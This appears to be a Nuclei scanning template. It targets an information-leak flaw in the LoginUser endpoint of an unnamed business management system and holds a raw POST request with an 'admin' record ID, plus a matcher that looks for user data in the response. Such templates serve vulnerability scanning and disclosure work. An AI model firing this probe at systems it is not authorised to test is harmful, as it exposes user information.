id: mywxt-LoginUser-info
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 某业务管理系统LoginUser存在信息泄露漏洞
  reference:
    - https://github.com/wy876/POC/blob/299ba35f3060728286cf1b0b201bab5aa6c1beb9/%E6%9F%90%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%9F%90%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FLoginUser%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |+
        POST /Login/LoginUser HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 80
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9

        {"recordid": "admin","password":"11112","undefined":"登录","language":"zh-CN"
        }

    matchers:
      - type: word
        part: body
        words:
          - 'USERN'
